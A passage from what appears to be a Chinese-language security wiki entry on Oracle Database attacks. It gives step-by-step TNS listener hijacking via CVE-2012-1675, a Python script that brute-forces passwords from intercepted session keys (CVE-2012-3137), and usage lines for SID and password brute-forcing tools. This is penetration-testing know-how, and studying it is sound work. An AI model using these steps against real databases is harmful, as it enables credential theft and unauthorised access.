0x0040</p><p>下面是列出了有效的数据包ID:</p><table><thead><tr><th>ID</th><th>描述</th></tr></thead><tbody><tr><td>0x01</td><td>协议协商。下面这些标识是可以接受的协议版本：0x06 0x05 0x04 0x03 0x02 0x01 0x00</td></tr><tr><td>0x02</td><td>交换数据类型</td></tr><tr><td>0x08</td><td>“OK”服务器给客户端的响应</td></tr><tr><td>0x11</td><td>TTI (Two-Task Interface)功能扩展</td></tr><tr><td>0x20</td><td>使用外部的程序和服务注册</td></tr><tr><td>0xdeadbeef</td><td>附加网络选项，客户端可协商附加连接熟悉，例如：认证，加密，数据完整性，监控。注意：wireshark 中叫这个包为 Secure Network Services</td></tr></tbody></table><h2 id="Oracle-Database-TNS-漏洞"><a href="#Oracle-Database-TNS-漏洞" class="headerlink" title="Oracle Database  TNS 漏洞"></a>Oracle Database  TNS 漏洞</h2><h3 id="TNS劫持"><a href="#TNS劫持" class="headerlink" title="TNS劫持"></a>TNS劫持</h3><p>​        知道目标物理地址和端口，本地搭建同名数据库，通过远程注册目标机器的TNS下同名实例</p><p>​        CVE-2012-1675漏洞是Oracle允许攻击者在不提供用户名/密码的情况下，向远程“TNS Listener”组件处理的数据投毒的漏洞。攻击者可利用此漏洞将数据库服务器的合法“TNS Listener”组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的中间人攻击、会话劫持或拒绝服务攻击。</p><p>​        CVE-2012-3137漏洞是Oracle Database 10g/11g身份验证协议实现中存在一个设计缺陷，攻击者无需认证即可远程获取数据库用户密码哈希相关数据，从而可以离线暴力破解用户密码，进一步控制数据库系统。</p><p>我们通过如下的步骤和过程可以实现对Oracle的入侵：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）利用CVE-<span class="number">2012</span>-<span class="number">1675</span>进行TNS劫持，在监听下利用远程注册，注册同名数据库实例；</span><br><span class="line">（<span class="number">2</span>）新登陆的用户，在TNS的负载均衡策略下，有可能流量登录到伪造的监听服务上；</span><br><span class="line">（<span class="number">3</span>）该监听服务对用户的登陆过程进行监控，并将相关数据流量转发到真实的数据库上；</span><br><span class="line">（<span class="number">4</span>）利用CVE-<span class="number">2012</span>-<span class="number">3137</span>获得通讯过程中的认证相关信息；</span><br><span class="line">（<span class="number">5</span>）对认证相关信息进行离线的暴力破解，获得登陆的密码；</span><br><span class="line">（<span class="number">6</span>）试用破解的用户名/密码登陆Oracle，完成对Oracle中数据的访问；</span><br></pre></td></tr></table></figure><p><strong>下面是一段可用的TNS劫持的过程：</strong></p><p>1.在劫持机上创建一个和目标数据库实例同名的数据库实例。</p><p>2.在劫持机上修改 tnsnames.ora 文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加</span><br><span class="line">listener_name=</span><br><span class="line">    (DESCRIPTION=</span><br><span class="line">    (ADDRESS=(PROTOCOL=tcp)(HOST=目标机器IP)(PORT=目标机器端口)))</span><br></pre></td></tr></table></figure><p>3.在劫持机上用SQLPlus 顺序执行下面步骤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端向TNS </span><br><span class="line">侦听器发送一个“数据包”（TNS_TYPE_DATA = 6），其中包含以下数据：</span><br><span class="line"></span><br><span class="line">  1.要注册的服务名称。</span><br><span class="line">  2.以指定的服务名称注册的实例。</span><br><span class="line">  3.允许的最大客户端连接数。</span><br><span class="line">  4.当前建立的客户端连接数。</span><br><span class="line">  5.处理程序的名称。</span><br><span class="line">  6.连接数据库的IP地址和端口。</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>$ sqlplus / <span class="keyword">as</span> sysdba</span><br><span class="line"><span class="number">2.</span> SQL&gt; ALTER SYSTEM SETREMOTE_LISTENER=<span class="string">&#x27;LISTENER_NAME&#x27;</span>;</span><br><span class="line"><span class="number">3.</span> SQL&gt; ALTER SYSTEM REGISTER;</span><br></pre></td></tr></table></figure><p>4.多个客户端，向数据库发起登录。会劫持到一部分客户端的登录信息。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/7.png"></p><p>​        按照猜想同一个监听下有2个同名实例。客户端访问监听，监听按照客户端中的数据库名信息分配数据库，由于监听下有2个同名数据库，客户端链接很可能会被分配到劫持者的数据库实例下，再通过配置劫持者的本地监听把客户端请求指回原数据库。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/9.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/8.png"></p><p>​        通过以上方式我们可以截获约一半左右客户端发送到服务器的合法链接。其中获得了服务器IP、端口号、数据库位置、实例名、登录用户名等一系列明文信息和4组密文信息（AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA）。</p><p>​        通过CVE-2012-3137进行密码破解</p><p>CVE-2012-3137受影响的数据库版本有11.2.0.3，11.2.0.2，11.1.0.7,有使用了SHA-1加密算法的10.2.0.5和10.2.0.4，还有使用了SHA-1的10.2.0.3（运行在z/OS下）版本。</p><p>​        确认加密方式之后，数据库用户被O3logon（oracle验证方式） 进行验证，这个协议执行一个序列来向数据库证明客户端拥有密码。为了避免网络第三方截获到密码。首先客户端发送用户名到数据库来表明用户身份。数据库端根据加密协议，其中96位的作为数据库端密钥，20位的作为偏移量，它对每个连接都是不同的。一个典型的数据库端发给客户端的密钥如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTH_SESSKEY.....COCDD89FIGODKWASDF……………………</span><br></pre></td></tr></table></figure><p>​        客户端根据加密算法向服务器端发送96位的客户端密钥和64位的密码密钥。服务器端计算客户端传入的密码密钥。如果计算后密码密文和数据库中存储的16位密码密文一致则验证通过。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/6.jpg"></p><p>​        这个过程可知上面TNS劫持包中取得的加密信息：AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA这四个值是解密的关键。我们把他们按照SHA1,MD5，AES192进行一系列处理。最终通过数据字典碰撞得到密码明文。</p><pre><code>import hashlib    from Crypto.Cipher import AESdef decrypt(session,salt,password):    pass_hash= hashlib.sha1(password+salt)    key =pass_hash.digest() + &#39;\x00\x00\x00\x00&#39;    decryptor= AES.new(key,AES.MODE_CBC)    plain =decryptor.decrypt(session)    return plainsession_hex =&#39;EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767&#39;  salt_hex = &#39;A7193E546377EC56639E&#39;  passwords = [&#39;test&#39;,&#39;password&#39;,&#39;oracle&#39;,&#39;demo&#39;]  for password in passwords:    session_id= decrypt(session_hex.decode(&#39;hex&#39;),salt_hex.decode(&#39;hex&#39;),password)    print&#39;Decrypted session_id for password &quot;%s&quot; is %s&#39; %(password,session_id.encode(&#39;hex&#39;))    if session_id[40:] == &#39;\x08\x08\x08\x08\x08\x08\x08\x08&#39;:           print&#39;PASSWORD IS &quot;%s&quot;&#39; % password           break</code></pre><h3 id="TNS缓冲区溢出"><a href="#TNS缓冲区溢出" class="headerlink" title="TNS缓冲区溢出"></a>TNS缓冲区溢出</h3><p>ORACLE调用系统用户做认证</p><p>CVE-2002-0965</p><p>SERVICE_NAME值超过20字节，导致溢出。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/11.png"></p><h2 id="Oracle-Database-SQL注入漏洞"><a href="#Oracle-Database-SQL注入漏洞" class="headerlink" title="Oracle Database SQL注入漏洞"></a>Oracle Database SQL注入漏洞</h2><p><strong>一、直接sql语句</strong></p><p>​    第二个请求有用户名和密文口令，下面有名称值对列表，描述客户端的属性，这部分可替换成任何sql语句，在sys环境执行。登录数据库时就可以创建用户。</p><p><img src="/10.PNG"></p><p><strong>二、PL/SQL语言</strong></p><p>匿名块：单次调用</p><p>命名块：有名称，存储在服务器，可多次调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE</span><br><span class="line">BEGIN</span><br><span class="line">EXCEPTION</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>变量的作用</p><p>在DECLARE阶段声明</p><p>每一行只能声明一个变量</p><p>声明标识符不能超过30字符，第一个字符为字母，不分大小写，不能用 -，不能用保留字，不能和引用的列同名，列名的优先级别高于变量。</p><p>PL/SQL变量：</p><p>复合变量：数组、记录、PL/SQL表</p><p>非PL/SQL变量</p><h2 id="Oracle-数据库评估工具"><a href="#Oracle-数据库评估工具" class="headerlink" title="Oracle 数据库评估工具"></a>Oracle 数据库评估工具</h2><h3 id="sidguesser"><a href="#sidguesser" class="headerlink" title="sidguesser"></a><strong>sidguesser</strong></h3><p>​        基于字典的SID爆破工具</p><ul><li>Oracle 数据库实例名称SID</li><li>一个数据库服务器可以创建多个数据库实例</li><li>SID是数据访问的入口</li></ul><p>​        Oracle是一个大型的数据库管理系统，在一台Oracle服务器上，我们可以为不同的应用创建各自独立的数据库实例。为了方便管理和访问不同的数据库实例，操作系统通过SID来识别不同的数据库。作为渗透测试者，发现库实例的SID是实现数据访问的第一步。sidguesser是一个基于字典的SID枚举工具，帮助渗透测试者发现数据访问的入口。</p><p>​        使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sidguess -i IP -d dict.txt</span><br></pre></td></tr></table></figure><h3 id="oscanner"><a href="#oscanner" class="headerlink" title="oscanner"></a><strong>oscanner</strong></h3><p>​        oscanner是一款针对oracle数据库服务器进行安全评估的框架软件，功能包括SID、身份信息、密码策略、用户角色权限等的爆破和枚举检查。由于此工具内建字典过于简陋，因此要想发挥应有的作用，我们必须手动完善字典内容。</p><ul><li><p>Java开发的Oracle安全评估框架</p></li><li><p>基于插件、字典的架构</p></li><li><p>SID枚举</p></li><li><p>密码爆破</p></li><li><p>Oracle版本枚举</p></li><li><p>账号角色枚举</p></li><li><p>账号权限枚举</p></li><li><p>审计信息枚举</p></li><li><p>密码策略枚举（自己配置密码字典，默认密码字典太简单）</p></li><li><p>数据库链接枚举</p><p>​    配置文件</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/oscanner/default.conf</span><br><span class="line">/usr/share/oscanner/diftionary.txt</span><br><span class="line">/usr/share/oscanner/users.txt</span><br><span class="line">/usr/share/oscanner/service.txt</span><br><span class="line">/usr/share/oscanner/oracleplugins.default</span><br><span class="line">/usr/share/oscanner/accounts.default</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s server -f serverlist -P 1521</span><br></pre></td></tr></table></figure><h3 id="tnscmd10g"><a href="#tnscmd10g" class="headerlink" title="tnscmd10g"></a><strong>tnscmd10g</strong></h3><p>​        Oracle数据库管理系统默认的服务端口是TCP  1521。在早期版本的Oracle系统中，通过对此端口的探测，可以获得大量系统信息，这给渗透测提供了有利的前提。tnscmd10g  主要针对7-9版本的Oracle数据库服务器，进行应用和操作系统层面的信息收集。同时也可以利用漏洞，直接输入并执行系统指令，上传和启动后门程序。10g以后版本的Oracle数据库大大提升了系统的安全性，使得本工具效果受限。</p><ul><li>针对Oracle 7-9i的信息收集工具</li><li>向TNS监听程序发送指令（TCP 1521）</li><li>爆破SID</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g verssion -h 192.168.1.1</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;Oracle-数据库体系结构&quot;&gt;&lt;a href=&quot;#Oracle-数据库体系结构&quot; class=&quot;headerlink&quot; title=&quot;Oracle 数据库体系结构&quot;&gt;&lt;/a&gt;Oracle 数据库体系结构&lt;/h2&gt;&lt;img src=&quot;/w</summary>
      
    
    
    
    <category term="数据库安全" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"/>
    
    <category term="Oracle Database" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"/>
    
    
    <category term="Oracle Database" scheme="http://example.com/tags/Oracle-Database/"/>
    
  </entry>
  
</feed>
